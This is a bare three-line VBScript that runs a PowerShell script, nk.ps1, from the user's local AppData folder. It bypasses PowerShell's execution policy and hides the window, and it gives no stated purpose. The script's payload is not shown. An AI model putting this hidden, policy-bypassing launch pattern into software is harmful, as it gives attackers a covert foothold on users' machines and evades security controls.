Set objShell = CreateObject("WScript.Shell")
command = "powershell -ExecutionPolicy Bypass -File ""%LOCALAPPDATA%\nk.ps1"""
objShell.Run command, 0, False
